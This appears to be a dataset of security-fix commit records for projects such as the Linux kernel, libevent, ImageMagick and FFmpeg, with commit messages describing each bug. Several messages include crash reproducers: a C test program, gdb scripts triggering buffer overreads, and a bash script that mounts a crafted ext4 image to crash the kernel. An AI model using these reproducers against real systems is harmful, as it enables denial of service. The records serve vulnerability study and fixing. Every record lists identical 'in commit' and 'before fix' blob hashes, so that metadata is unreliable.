aio: mark AIO pseudo-fs noexec\n\nThis ensures that do_mmap() won't implicitly make AIO memory mappings executable if the READ_IMPLIES_EXEC personality flag is set.  Such behavior is problematic because the security_mmap_file LSM hook doesn't catch this case, potentially permitting an attacker to bypass a W^X policy enforced by SELinux.\n\nI have tested the patch on my machine.\n\nTo test the behavior, compile and run this:\n\n    #define _GNU_SOURCE     #include <unistd.h>     #include <sys/personality.h>     #include <linux/aio_abi.h>     #include <err.h>     #include <stdlib.h>     #include <stdio.h>     #include <sys/syscall.h>\n\n    int main(void) {         personality(READ_IMPLIES_EXEC)          aio_context_t ctx = 0          if (syscall(__NR_io_setup, 1, &ctx))             err(1, "io_setup") \n\n        char cmd[1000]          sprintf(cmd, "cat /proc/%d/maps | grep -F '/[aio]'",             (int)getpid())          system(cmd)          return 0      }\n\nIn the output, "rw-s" is good, "rwxs" is bad.\n\nSigned-off-by: Jann Horn <jann@thejh.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    933e96f01a8c889c7bf5ffd30020e86a02a046e7
File(s) In Commit: 
    MagickWand/magick-cli.c
Blob(s) In Commit: 
    c28dd71696cc89589b7199ff1fc336e7114e5fd7
Blob(s) Before Fix: 
    c28dd71696cc89589b7199ff1fc336e7114e5fd7
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 933e96f01a8c889c7bf5ffd30020e86a02a046e7:
https://github.com/ImageMagick/ImageMagick/issues/196

======================================================================
Commit With Fix: 
    4e914bbe371433f0590cefdf3bd5f3a5710069f9
File(s) In Commit: 
    coders/tiff.c
Blob(s) In Commit: 
    fa589d94f6eecaabc0c66fa62bfb0d0d0563716b
Blob(s) Before Fix: 
    fa589d94f6eecaabc0c66fa62bfb0d0d0563716b
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 4e914bbe371433f0590cefdf3bd5f3a5710069f9:
https://github.com/ImageMagick/ImageMagick/issues/196

======================================================================
Commit With Fix: 
    8a370f9ab120faf182aa160900ba692ba8e2bcf0
File(s) In Commit: 
    coders/mat.c
Blob(s) In Commit: 
    564e745ecda2a87bd7c738bc6a798cab78c15ca2
Blob(s) Before Fix: 
    564e745ecda2a87bd7c738bc6a798cab78c15ca2
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 8a370f9ab120faf182aa160900ba692ba8e2bcf0:
Added check for invalid number of frames.

======================================================================
Commit With Fix: 
    7df3830c81716b959a2d0d3a0d8216b860ae0dc7
File(s) In Commit: 
    admin/plugin.php
Blob(s) In Commit: 
    16de979a52a159bb1a3d2e59794415b7c1624dab
Blob(s) Before Fix: 
    16de979a52a159bb1a3d2e59794415b7c1624dab
Projects:
    7tonin_Piwigo
Commit Message for 7df3830c81716b959a2d0d3a0d8216b860ae0dc7:
fixes #575, sanitize user input before display on die()

======================================================================
Commit With Fix: 
    9dd92959f6975099e0c62163a846a4648a6a920f
File(s) In Commit: 
    admin/batch_manager.php
Blob(s) In Commit: 
    792cb1f5470238c27a2b1bf111da0b98c8b2c29c
Blob(s) Before Fix: 
    792cb1f5470238c27a2b1bf111da0b98c8b2c29c
Projects:
    7tonin_Piwigo
Commit Message for 9dd92959f6975099e0c62163a846a4648a6a920f:
fixes #572, check $_GET['mode'] against hacking attempt

======================================================================
Commit With Fix: 
    4b33a0fd199fd445b15a49927ea6a9a153e3877d
File(s) In Commit: 
    admin/languages.php
Blob(s) In Commit: 
    936e5b2537fee7489b2b9736f59696feed9225c0
Blob(s) Before Fix: 
    936e5b2537fee7489b2b9736f59696feed9225c0
Projects:
    7tonin_Piwigo
Commit Message for 4b33a0fd199fd445b15a49927ea6a9a153e3877d:
fixes #573, check $_GET['tab'] against hacking attempt

======================================================================
Commit With Fix: 
    e986ea3dfa4a2957f71ae9bfaed406dd6e1ffff6
File(s) In Commit: 
    doc/lxc-attach.sgml.in
Blob(s) In Commit: 
    653ce1d9bd917ea22a9b29b8e40d0762f094e062
Blob(s) Before Fix: 
    653ce1d9bd917ea22a9b29b8e40d0762f094e062
Projects:
    0x0916_lxc
Commit Message for e986ea3dfa4a2957f71ae9bfaed406dd6e1ffff6:
update lxc-attach manpage\n\n- explain rationale behind allocation of pty - briefly explain how a pty is allocated - add a short note that describes the changed behavior for lxc-attach when the   user is not placed in a writeable cgroup at login\n\nSigned-off-by: Christian Brauner <christian.brauner@mailbox.org>

======================================================================
Commit With Fix: 
    97566cf2806c0a5a86e884c96831a0c3b1ec6c20
File(s) In Commit: 
    coders/ipl.c
Blob(s) In Commit: 
    58c60ca5582773402f3b1404f7ce9ddcff32dc22
Blob(s) Before Fix: 
    58c60ca5582773402f3b1404f7ce9ddcff32dc22
Projects:
    2016repotsheyue_ImageMagick
Commit Message for 97566cf2806c0a5a86e884c96831a0c3b1ec6c20:
...

======================================================================
Commit With Fix: 
    d23beebe7b1179fb75db1e85fbca3100e49593d9
File(s) In Commit: 
    coders/wpg.c
Blob(s) In Commit: 
    82c3b7e29e0b08d238b27321793bf5620884cfbb
Blob(s) Before Fix: 
    82c3b7e29e0b08d238b27321793bf5620884cfbb
Projects:
    2016repotsheyue_ImageMagick
Commit Message for d23beebe7b1179fb75db1e85fbca3100e49593d9:
...

======================================================================
Commit With Fix: 
    48a992727d82cb7db076fa15d372178743b1f4cd
File(s) In Commit: 
    crypto/mcryptd.c
Blob(s) In Commit: 
    c207458d62993350d9a0cfca5e1deca573b09c8c
Blob(s) Before Fix: 
    c207458d62993350d9a0cfca5e1deca573b09c8c
Projects:
    0-T-0_ps4-linux
Commit Message for 48a992727d82cb7db076fa15d372178743b1f4cd:
crypto: mcryptd - Check mcryptd algorithm compatibility\n\nAlgorithms not compatible with mcryptd could be spawned by mcryptd with a direct crypto_alloc_tfm invocation using a "mcryptd(alg)" name construct.  This causes mcryptd to crash the kernel if an arbitrary "alg" is incompatible and not intended to be used with mcryptd.  It is an issue if AF_ALG tries to spawn mcryptd(alg) to expose it externally. But such algorithms must be used internally and not be exposed.\n\nWe added a check to enforce that only internal algorithms are allowed with mcryptd at the time mcryptd is spawning an algorithm.\n\nLink: http://marc.info/?l=linux-crypto-vger&m=148063683310477&w=2 Cc: stable@vger.kernel.org Reported-by: Mikulas Patocka <mpatocka@redhat.com> Signed-off-by: Tim Chen <tim.c.chen@linux.intel.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>

======================================================================
Commit With Fix: 
    a0f1d21c1ccb1da66629627a74059dd7f5ac9c61
File(s) In Commit: 
    virt/kvm/kvm_main.c
Blob(s) In Commit: 
    7f9ee2929cfea3ba0d30740e5c82109c14d359e4
Blob(s) Before Fix: 
    7f9ee2929cfea3ba0d30740e5c82109c14d359e4
Projects:
    0-T-0_ps4-linux
Commit Message for a0f1d21c1ccb1da66629627a74059dd7f5ac9c61:
KVM: use after free in kvm_ioctl_create_device()\n\nWe should move the ops->destroy(dev) after the list_del(&dev->vm_node) so that we don't use "dev" after freeing it.\n\nFixes: a28ebea2adc4 ("KVM: Protect device ops->create and list_add with kvm->lock") Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com> Reviewed-by: David Hildenbrand <david@redhat.com> Signed-off-by: Radim Krčmář <rkrcmar@redhat.com>

======================================================================
Commit With Fix: 
    06deeec77a5a689cc94b21a8a91a76e42176685d
File(s) In Commit: 
    fs/cifs/smbencrypt.c
Blob(s) In Commit: 
    c12bffefa3c9b59b2290ecdb243ae308b08e7224
Blob(s) Before Fix: 
    c12bffefa3c9b59b2290ecdb243ae308b08e7224
Projects:
    0-T-0_ps4-linux
Commit Message for 06deeec77a5a689cc94b21a8a91a76e42176685d:
cifs: Fix smbencrypt() to stop pointing a scatterlist at the stack\n\nsmbencrypt() points a scatterlist to the stack, which is breaks if CONFIG_VMAP_STACK=y.\n\nFix it by switching to crypto_cipher_encrypt_one().  The new code should be considerably faster as an added benefit.\n\nThis code is nearly identical to some code that Eric Biggers suggested.\n\nCc: stable@vger.kernel.org # 4.9 only Reported-by: Eric Biggers <ebiggers3@gmail.com> Signed-off-by: Andy Lutomirski <luto@kernel.org> Acked-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com>

======================================================================
Commit With Fix: 
    5ca71a7bc18b6897ab21d815d15e218e204581e2
File(s) In Commit: 
    src/cmstypes.c
Blob(s) In Commit: 
    c7328b9999826069e919f57bed4fef69210e5173
Blob(s) Before Fix: 
    c7328b9999826069e919f57bed4fef69210e5173
Projects:
    13-Graphics_Little-CMS
Commit Message for 5ca71a7bc18b6897ab21d815d15e218e204581e2:
Added an extra check to MLU bounds\n\nThanks to Ibrahim el-sayed for spotting the bug

======================================================================
Commit With Fix: 
    60bfb401ad5a4a8ae995dcd36372fe15c71e1a35
File(s) In Commit: 
    src/gd_interpolation.c
Blob(s) In Commit: 
    b9a206551dc5366a2eb4b53d22b429c9893b5236
Blob(s) Before Fix: 
    b9a206551dc5366a2eb4b53d22b429c9893b5236
Projects:
    86salo_libgd
Commit Message for 60bfb401ad5a4a8ae995dcd36372fe15c71e1a35:
Fix potential unsigned underflow\n\nNo need to decrease `u`, so we don't do it. While we're at it, we also factor out the overflow check of the loop, what improves performance and readability.\n\nThis issue has been reported by Stefan Esser to security@libgd.org.

======================================================================
Commit With Fix: 
    701ab8129ba9ea64f569daedca9a8603abad740f
File(s) In Commit: 
    protocols/bee_ft.c
Blob(s) In Commit: 
    916b2e88cfffcc71563c1d46f8bfb3c35d945255
Blob(s) Before Fix: 
    916b2e88cfffcc71563c1d46f8bfb3c35d945255
Projects:
    AaronVanGeffen_bitlbee
Commit Message for 701ab8129ba9ea64f569daedca9a8603abad740f:
imcb_file_send_start: handle ft attempts from non-existing users

======================================================================
Commit With Fix: 
    2a05c8f813de6f2278827734bf8102291e7484aa
File(s) In Commit: 
    libavformat/http.c
Blob(s) In Commit: 
    13f3be42271095425a837deaf75ab522572b4a28
Blob(s) Before Fix: 
    13f3be42271095425a837deaf75ab522572b4a28
Projects:
    00ERNEST00_FFmpeg
Commit Message for 2a05c8f813de6f2278827734bf8102291e7484aa:
http: make length/offset-related variables unsigned.\n\nFixes #5992, reported and found by Paul Cher <paulcher@icloud.com>.

======================================================================
Commit With Fix: 
    7d57ca4d9a75562fa32e40766211de150f8b3ee7
File(s) In Commit: 
    libavformat/rtmppkt.c
Blob(s) In Commit: 
    cde0da78ce144b23a74944e17080b5fca86587ec
Blob(s) Before Fix: 
    cde0da78ce144b23a74944e17080b5fca86587ec
Projects:
    00ERNEST00_FFmpeg
Commit Message for 7d57ca4d9a75562fa32e40766211de150f8b3ee7:
avformat/rtmppkt: Check for packet size mismatches\n\nFixes out of array access\n\nFound-by: Paul Cher <paulcher@icloud.com> Reviewed-by: Paul Cher <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    a5d25faa3f4b18dac737fdb35d0dd68eb0dc2156
File(s) In Commit: 
    ffserver.c
Blob(s) In Commit: 
    02a583464b3784b19139c711943372cb2f295cef
Blob(s) Before Fix: 
    02a583464b3784b19139c711943372cb2f295cef
Projects:
    00ERNEST00_FFmpeg
Commit Message for a5d25faa3f4b18dac737fdb35d0dd68eb0dc2156:
ffserver: Check chunk size\n\nFixes out of array access\n\nFixes: poc_ffserver.py Found-by: Paul Cher <paulcher@icloud.com> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>

======================================================================
Commit With Fix: 
    96f64a022014a208105ead6c8a7066018449d86d
File(s) In Commit: 
    evdns.c
Blob(s) In Commit: 
    c4112330a9c532982511cfe6edee2ff1624a12c3
Blob(s) Before Fix: 
    c4112330a9c532982511cfe6edee2ff1624a12c3
Projects:
    10corp_libevent-1
Commit Message for 96f64a022014a208105ead6c8a7066018449d86d:
evdns: name_parse(): fix remote stack overread\n\n@asn-the-goblin-slayer:   "the name_parse() function in libevent's DNS code is vulnerable to a buffer overread.\n\n   971         if (cp != name_out) {    972             if (cp + 1 >= end) return -1     973             *cp++ = '.'     974         }    975         if (cp + label_len >= end) return -1     976         memcpy(cp, packet + j, label_len)     977         cp += label_len     978         j += label_len     No check is made against length before the memcpy occurs.\n\n   This was found through the Tor bug bounty program and the discovery should be credited to 'Guido Vranken'."\n\nReproducer for gdb (https://gist.github.com/azat/e4fcf540e9b89ab86d02):   set $PROT_NONE=0x0   set $PROT_READ=0x1   set $PROT_WRITE=0x2   set $MAP_ANONYMOUS=0x20   set $MAP_SHARED=0x01   set $MAP_FIXED=0x10   set $MAP_32BIT=0x40\n\n  start\n\n  set $length=202   # overread   set $length=2   # allocate with mmap to have a seg fault on page boundary   set $l=(1<<20)*2   p mmap(0, $l, $PROT_READ|$PROT_WRITE, $MAP_ANONYMOUS|$MAP_SHARED|$MAP_32BIT, -1, 0)   set $packet=(char *)$1+$l-$length   # hack the packet   set $packet[0]=63   set $packet[1]='/'\n\n  p malloc(sizeof(int))   set $idx=(int *)$2   set $idx[0]=0   set $name_out_len=202\n\n  p malloc($name_out_len)   set $name_out=$3\n\n  # have WRITE only mapping to fail on read   set $end=$1+$l   p (void *)mmap($end, 1<<12, $PROT_NONE, $MAP_ANONYMOUS|$MAP_SHARED|$MAP_FIXED|$MAP_32BIT, -1, 0)   set $m=$4\n\n  p name_parse($packet, $length, $idx, $name_out, $name_out_len)   x/2s (char *)$name_out\n\nBefore this patch: $ gdb -ex 'source gdb' dns-example $1 = 1073741824 $2 = (void *) 0x633010 $3 = (void *) 0x633030 $4 = (void *) 0x40200000\n\nProgram received signal SIGSEGV, Segmentation fault. __memcpy_sse2_unaligned () at memcpy-sse2-unaligned.S:33\n\nAfter this patch: $ gdb -ex 'source gdb' dns-example $1 = 1073741824 $2 = (void *) 0x633010 $3 = (void *) 0x633030 $4 = (void *) 0x40200000 $5 = -1 0x633030:       "/" 0x633032:       "" (gdb) p $m $6 = (void *) 0x40200000 (gdb) p $1 $7 = 1073741824 (gdb) p/x $1 $8 = 0x40000000 (gdb) quit\n\nP.S. plus drop one condition duplicate.\n\nFixes: #317

======================================================================
Commit With Fix: 
    329acc18a0768c21ba22522f01a5c7f46cacc4d5
File(s) In Commit: 
    evutil.c
Blob(s) In Commit: 
    495bfcc029e4b397c5ea4581ec9d0aaad2f08bce
Blob(s) Before Fix: 
    495bfcc029e4b397c5ea4581ec9d0aaad2f08bce
Projects:
    10corp_libevent-1
Commit Message for 329acc18a0768c21ba22522f01a5c7f46cacc4d5:
evutil_parse_sockaddr_port(): fix buffer overflow\n\n@asn-the-goblin-slayer:   "Length between '[' and ']' is cast to signed 32 bit integer on line 1815. Is    the length is more than 2<<31 (INT_MAX), len will hold a negative value.    Consequently, it will pass the check at line 1816. Segfault happens at line    1819.\n\n   Generate a resolv.conf with generate-resolv.conf, then compile and run    poc.c. See entry-functions.txt for functions in tor that might be    vulnerable.\n\n   Please credit 'Guido Vranken' for this discovery through the Tor bug bounty    program."\n\nReproducer for gdb (https://gist.github.com/azat/be2b0d5e9417ba0dfe2c):   start   p (1ULL<<31)+1ULL   # $1 = 2147483649   p malloc(sizeof(struct sockaddr))   # $2 = (void *) 0x646010   p malloc(sizeof(int))   # $3 = (void *) 0x646030   p malloc($1)   # $4 = (void *) 0x7fff76a2a010   p memset($4, 1, $1)   # $5 = 1990369296   p (char *)$4   # $6 = 0x7fff76a2a010 '\001' <repeats 200 times>...   set $6[0]='['   set $6[$1]=']'   p evutil_parse_sockaddr_port($4, $2, $3)   # $7 = -1\n\nBefore:   $ gdb bin/http-connect < gdb   (gdb) $1 = 2147483649   (gdb) (gdb) $2 = (void *) 0x646010   (gdb) (gdb) $3 = (void *) 0x646030   (gdb) (gdb) $4 = (void *) 0x7fff76a2a010   (gdb) (gdb) $5 = 1990369296   (gdb) (gdb) $6 = 0x7fff76a2a010 '\001' <repeats 200 times>...   (gdb) (gdb) (gdb) (gdb)   Program received signal SIGSEGV, Segmentation fault.   __memcpy_sse2_unaligned () at memcpy-sse2-unaligned.S:36\n\nAfter:   $ gdb bin/http-connect < gdb   (gdb) $1 = 2147483649   (gdb) (gdb) $2 = (void *) 0x646010   (gdb) (gdb) $3 = (void *) 0x646030   (gdb) (gdb) $4 = (void *) 0x7fff76a2a010   (gdb) (gdb) $5 = 1990369296   (gdb) (gdb) $6 = 0x7fff76a2a010 '\001' <repeats 200 times>...   (gdb) (gdb) (gdb) (gdb) $7 = -1   (gdb) (gdb) quit\n\nFixes: #318

======================================================================
Commit With Fix: 
    ec65c42052d95d2c23d1d837136d1cf1d9ecef9e
File(s) In Commit: 
    evdns.c
Blob(s) In Commit: 
    e9dbc35c60662ccda395d21d95997193840b4b57
Blob(s) Before Fix: 
    e9dbc35c60662ccda395d21d95997193840b4b57
Projects:
    10corp_libevent-1
Commit Message for ec65c42052d95d2c23d1d837136d1cf1d9ecef9e:
evdns: fix searching empty hostnames\n\nFrom #332:   Here follows a bug report by **Guido Vranken** via the _Tor bug bounty program_. Please credit Guido accordingly.\n\n  ## Bug report\n\n  The DNS code of Libevent contains this rather obvious OOB read:\n\n  ```c   static char *   search_make_new(const struct search_state *const state, int n, const char *const base_name) {       const size_t base_len = strlen(base_name)        const char need_to_append_dot = base_name[base_len - 1] == '.' ? 0 : 1    ```\n\n  If the length of ```base_name``` is 0, then line 3125 reads 1 byte before the buffer. This will trigger a crash on ASAN-protected builds.\n\n  To reproduce:\n\n  Build libevent with ASAN:   ```   $ CFLAGS='-fomit-frame-pointer -fsanitize=address' ./configure && make -j4   ```   Put the attached ```resolv.conf``` and ```poc.c``` in the source directory and then do:\n\n  ```   $ gcc -fsanitize=address -fomit-frame-pointer poc.c .libs/libevent.a   $ ./a.out   =================================================================   ==22201== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60060000efdf at pc 0x4429da bp 0x7ffe1ed47300 sp 0x7ffe1ed472f8   READ of size 1 at 0x60060000efdf thread T0   ```\n\nP.S. we can add a check earlier, but since this is very uncommon, I didn't add it.\n\nFixes: #332

======================================================================
Commit With Fix: 
    3a4b77cd47bb837b8557595ec7425f281f2ca1fe
File(s) In Commit: 
    fs/ext4/super.c
Blob(s) In Commit: 
    32c0debbaa923aa22da752047f8c05c184a3bcf9
Blob(s) Before Fix: 
    32c0debbaa923aa22da752047f8c05c184a3bcf9
Projects:
    0-T-0_ps4-linux
Commit Message for 3a4b77cd47bb837b8557595ec7425f281f2ca1fe:
ext4: validate s_first_meta_bg at mount time\n\nRalf Spenneberg reported that he hit a kernel crash when mounting a modified ext4 image. And it turns out that kernel crashed when calculating fs overhead (ext4_calculate_overhead()), this is because the image has very large s_first_meta_bg (debug code shows it's 842150400), and ext4 overruns the memory in count_overhead() when setting bitmap buffer, which is PAGE_SIZE.\n\next4_calculate_overhead():   buf = get_zeroed_page(GFP_NOFS)   <=== PAGE_SIZE buffer   blks = count_overhead(sb, i, buf) \n\ncount_overhead():   for (j = ext4_bg_num_gdb(sb, grp)  j > 0  j--) { <=== j = 842150400           ext4_set_bit(EXT4_B2C(sbi, s++), buf)    <=== buffer overrun           count++    }\n\nThis can be reproduced easily for me by this script:\n\n  #!/bin/bash   rm -f fs.img   mkdir -p /mnt/ext4   fallocate -l 16M fs.img   mke2fs -t ext4 -O bigalloc,meta_bg,^resize_inode -F fs.img   debugfs -w -R "ssv first_meta_bg 842150400" fs.img   mount -o loop fs.img /mnt/ext4\n\nFix it by validating s_first_meta_bg first at mount time, and refusing to mount if its value exceeds the largest possible meta_bg number.\n\nReported-by: Ralf Spenneberg <ralf@os-t.de> Signed-off-by: Eryu Guan <guaneryu@gmail.com> Signed-off-by: Theodore Ts'o <tytso@mit.edu> Reviewed-by: Andreas Dilger <adilger@dilger.ca>

======================================================================
Commit With Fix: 
    59ebef5978f80e2fdc7b4db4a28b668c5a39fbc3
File(s) In Commit: 
    core/admin/ajax/dashboard/check-module-integrity.php
Blob(s) In Commit: 
    cf29b95f757c50c0564a39259b425416cd97aea1
Blob(s) Before Fix: 
    cf29b95f757c50c0564a39259b425416cd97aea1
Projects:
    4v4t4r_BigTree-CMS
Commit Message for 59ebef5978f80e2fdc7b4db4a28b668c5a39fbc3:
Fixing potential XSS attack vector. Thanks to Haojun Hou in ADLab of Venustech.

======================================================================
Commit With Fix: 
    bdfe95a6e81ffb4b2fad31a76b57943695beed20
File(s) In Commit: 
    src/libjasper/jp2/jp2_cod.c
Blob(s) In Commit: 
    7f3608ab8de79f357605dbfe6bb3ce18fa8c3c4c
Blob(s) Before Fix: 
    7f3608ab8de79f357605dbfe6bb3ce18fa8c3c4c
Projects:
    did-g_jasper
Commit Message for bdfe95a6e81ffb4b2fad31a76b57943695beed20:
Fixed another problem with incorrect cleanup of JP2 box data upon error.

======================================================================
Commit With Fix: 
    163ae1c6ad6299b19e22b4a35d5ab24a89791a98
File(s) In Commit: 
    fs/crypto/policy.c
Blob(s) In Commit: 
    c9800b1a2e930f65e8fa7a9b052fb80efeba512c
Blob(s) Before Fix: 
    c9800b1a2e930f65e8fa7a9b052fb80efeba512c
Projects:
    0-T-0_ps4-linux
Commit Message for 163ae1c6ad6299b19e22b4a35d5ab24a89791a98:
fscrypto: add authorization check for setting encryption policy\n\nOn an ext4 or f2fs filesystem with file encryption supported, a user could set an encryption policy on any empty directory(*) to which they had readonly access.  This is obviously problematic, since such a directory might be owned by another user and the new encryption policy would prevent that other user from creating files in their own directory (for example).\n\nFix this by requiring inode_owner_or_capable() permission to set an encryption policy.  This means that either the caller must own the file, or the caller must have the capability CAP_FOWNER.\n\n(*) Or also on any regular file, for f2fs v4.6 and later and ext4     v4.8-rc1 and later  a separate bug fix is coming for that.\n\nSigned-off-by: Eric Biggers <ebiggers@google.com> Cc: stable@vger.kernel.org # 4.1+  check fs/{ext4,f2fs} Signed-off-by: Theodore Ts'o <tytso@mit.edu>

======================================================================
Commit With Fix: 
    388703b9ca1912a5438e37f9dd54c35805f2c594
File(s) In Commit: 
    Telegram/SourceFiles/settings.h
Blob(s) In Commit: 
    d4100aec8b2d70cfe85810ceb26df647e0dfdcc4
Blob(s) Before Fix: 
    d4100aec8b2d70cfe85810ceb26df647e0dfdcc4
Projects:
    0577215664_tdesktop
Commit Message for 388703b9ca1912a5438e37f9dd54c35805f2c594:
Fix CVE-2016-10351: Insecure cWorkingDir permissions.\n\nSet 700 permisson on dir on every start.\n\nSigned-off-by: Alexander GQ Gerasiov <gq@cs.msu.su>

======================================================================
Commit With Fix: 
    333f65bae9106182d12e02d249d4f95e16e93fa2
File(s) In Commit: 
    modules/apps/foundation/frontend-js/frontend-js-spa-web/src/main/resources/META-INF/resources/init.jsp
Blob(s) In Commit: 
    3e402560fb130a122a5a86f6b4e955efa3f3ffee
Blob(s) Before Fix: 
    3e402560fb130a122a5a86f6b4e955efa3f3ffee
Projects:
    4lejandrito_liferay-portal
Commit Message for 333f65bae9106182d12e02d249d4f95e16e93fa2:
LPS-68469 Missing escape

======================================================================
Commit With Fix: 
    397f62c0a838e15d667ef50e27d5d011d2c79c04
File(s) In Commit: 
    src/lib/openjp2/tcd.c
Blob(s) In Commit: 
    08c5a765a12910c26243ecaeefc2a5ad9186ec0e
Blob(s) Before Fix: 
    08c5a765a12910c26243ecaeefc2a5ad9186ec0e
Projects:
    01bui_openjpeg
Commit Message for 397f62c0a838e15d667ef50e27d5d011d2c79c04:
Fix write heap buffer overflow in opj_mqc_byteout(). Discovered by Ke Liu of Tencent's Xuanwu LAB (#835)

======================================================================
Commit With Fix: 
    d27ccf01c68a31ad62b33d2dc1ba2bb1eeaafe7b
File(s) In Commit: 
    src/lib/openjp2/pi.c
Blob(s) In Commit: 
    798867a80e3a2385d5af8af4ea2bab9aebc07542
Blob(s) Before Fix: 
    798867a80e3a2385d5af8af4ea2bab9aebc07542
Projects:
    01bui_openjpeg
Commit Message for d27ccf01c68a31ad62b33d2dc1ba2bb1eeaafe7b:
Avoid division by zero in opj_pi_next_rpcl, opj_pi_next_pcrl and opj_pi_next_cprl (#938)\n\nFixes issues with id:000026,sig:08,src:002419,op:int32,pos:60,val:+32 and id:000019,sig:08,src:001098,op:flip1,pos:49

======================================================================
Commit With Fix: 
    da940424816e11d624362ce080bc026adffa26e8
File(s) In Commit: 
    src/bin/jp2/convertbmp.c
Blob(s) In Commit: 
    ae83077caafce06d872fb498c766423c88fe77d6
Blob(s) Before Fix: 
    ae83077caafce06d872fb498c766423c88fe77d6
Projects:
    01bui_openjpeg
Commit Message for da940424816e11d624362ce080bc026adffa26e8:
Merge pull request #834 from trylab/issue833\n\nFix issue 833.

======================================================================
Commit With Fix: 
    162ae709162be3e6c4d942313a278ca5cbdb8e92
File(s) In Commit: 
    demo/phpThumb.demo.showpic.php
Blob(s) In Commit: 
    a8d9a9b81d39b1c25a7f94e49010853f59148184
Blob(s) Before Fix: 
    a8d9a9b81d39b1c25a7f94e49010853f59148184
Projects:
    13601313270_smarty
Commit Message for 162ae709162be3e6c4d942313a278ca5cbdb8e92:
demo.showpic security fix\n\nSanitize input data to prevent Reflected XSS problems

======================================================================
Commit With Fix: 
    b95044da6ac608e7239f7949ff21d3b65be68f82
File(s) In Commit: 
    upload/admin/model/openbay/amazon.php
Blob(s) In Commit: 
    8d9a306d9bacc1fef1c40160befdf6bb9dd55c77
Blob(s) Before Fix: 
    8d9a306d9bacc1fef1c40160befdf6bb9dd55c77
Projects:
    0xhacking_opencart-1
Commit Message for b95044da6ac608e7239f7949ff21d3b65be68f82:
https://github.com/opencart/opencart/issues/4114

======================================================================
Commit With Fix: 
    9a93d1f44b06605af84520509e7a0e8b64ab0c05
File(s) In Commit: 
    include/functions_search.inc.php
Blob(s) In Commit: 
    59fc97cacab75660e2df074fbe7fe2c4cb557dd5
Blob(s) Before Fix: 
    59fc97cacab75660e2df074fbe7fe2c4cb557dd5
Projects:
    7tonin_Piwigo
Commit Message for 9a93d1f44b06605af84520509e7a0e8b64ab0c05:
fixes #548, escape HTML chars from search expression\n\nbefore sending them to HTML comment on frontend

======================================================================
Commit With Fix: 
    b3157cbfd859c914911b114d4edbba4654758b57
File(s) In Commit: 
    include/functions.inc.php
Blob(s) In Commit: 
    39b618d812b33b409ed364d6c4bc0eacd238dddd
Blob(s) Before Fix: 
    39b618d812b33b409ed364d6c4bc0eacd238dddd
Projects:
    7tonin_Piwigo
Commit Message for b3157cbfd859c914911b114d4edbba4654758b57:
fixes #547, strong checks on url format

======================================================================
Commit With Fix: 
    69983495cd41bf0903fe02baeef84b1fa85f2846
File(s) In Commit: 
    auth_login.php
Blob(s) In Commit: 
    1e94426b7189f38b2fc1452c83cb85842829e795
Blob(s) Before Fix: 
    1e94426b7189f38b2fc1452c83cb85842829e795
Projects:
    3yahya_cacti
Commit Message for 69983495cd41bf0903fe02baeef84b1fa85f2846:
fixing bug #2697\n\nweb basic for guest accounts

======================================================================
Commit With Fix: 
    cfb1fae25f8c092e0d17073eaf7bd428ce1cd546
File(s) In Commit: 
    zebra/rtadv.c
Blob(s) In Commit: 
    2f62714d81db32a0fdb0e049c7aed7cdd8ceb19d
Blob(s) Before Fix: 
    2f62714d81db32a0fdb0e049c7aed7cdd8ceb19d
Projects:
    522428182_frr
Commit Message for cfb1fae25f8c092e0d17073eaf7bd428ce1cd546:
zebra: stack overrun in IPv6 RA receive code (CVE-2016-1245)\n\nThe IPv6 RA code also receives ICMPv6 RS and RA messages. Unfortunately, by bad coding practice, the buffer size specified on receiving such messages mixed up 2 constants that in fact have different values.\n\nThe code itself has:  #define RTADV_MSG_SIZE 4096 While BUFSIZ is system-dependent, in my case (x86_64 glibc):  /usr/include/_G_config.h:#define _G_BUFSIZ 8192  /usr/include/libio.h:#define _IO_BUFSIZ _G_BUFSIZ  /usr/include/stdio.h:# define BUFSIZ _IO_BUFSIZ\n\nFreeBSD, OpenBSD, NetBSD and Illumos are not affected, since all of them have BUFSIZ == 1024.\n\nAs the latter is passed to the kernel on recvmsg(), it's possible to overwrite 4kB of stack -- with ICMPv6 packets that can be globally sent to any of the system's addresses (using fragmentation to get to 8k).\n\n(The socket has filters installed limiting this to RS and RA packets, but does not have a filter for source address or TTL.)\n\nIssue discovered by trying to test other stuff, which randomly caused the stack to be smaller than 8kB in that code location, which then causes the kernel to report EFAULT (Bad address).\n\nSigned-off-by: David Lamparter <equinox@opensourcerouting.org> Reviewed-by: Donald Sharp <sharpd@cumulusnetworks.com>

======================================================================
Commit With Fix: 
    7c164a0c86cec6ee95df1d141e67b0e85dfdefd2
File(s) In Commit: 
    dbdimp.c
Blob(s) In Commit: 
    d0b46c308015aa396b6acb25355660472eee0bc9
Blob(s) Before Fix: 
    d0b46c308015aa396b6acb25355660472eee0bc9
Projects:
    Acidburn0zzz_DBD-mysql
Commit Message for 7c164a0c86cec6ee95df1d141e67b0e85dfdefd2:
Do not use unsafe sprintf w/variable length input\n\nThis can cause a  buffer overflow to occur when reporting error message about validation of (untrusted) user input parameters.

======================================================================
Commit With Fix: 
    d0331e8e5b05b475f20b1f3101fe1ad772d7e7e7
File(s) In Commit: 
    libarchive/archive_read_support_format_zip.c
Blob(s) In Commit: 
    0a0be96b5990ba0a7837fb9e53dd744900864d51
Blob(s) Before Fix: 
    0a0be96b5990ba0a7837fb9e53dd744900864d51
Projects:
    AasemShokr_libarchive
Commit Message for d0331e8e5b05b475f20b1f3101fe1ad772d7e7e7:
